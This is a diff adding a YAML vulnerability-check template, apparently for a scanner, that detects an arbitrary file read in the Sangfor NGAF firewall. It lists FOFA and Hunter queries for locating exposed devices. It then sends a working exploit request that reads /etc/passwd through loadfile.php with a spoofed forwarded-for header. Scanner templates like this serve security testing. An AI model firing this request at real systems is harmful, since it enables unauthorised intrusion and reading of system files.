@@ -1,0 +1,26 @@
+id: sangfor-ngaf-fileread
+
+info:
+  name: 深信服 NGAF 任意文件读取漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    深信服下一代防火墙NGAF
+    FOFA: "Redirect.php?url=/LogInOut.php" && port="85"
+    FOFA: title="SANGFOR | NGAF"
+    HUNTER: web.body="LogInOut.php?type=logout"
+  reference:
+    - https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/
+  tags: sangfor,fileread
+  created: 2023/09/08
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /svpn_html/loadfile.php?file=/etc/./passwd
+      headers:
+        y-forwarded-for: 127.0.0.1
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
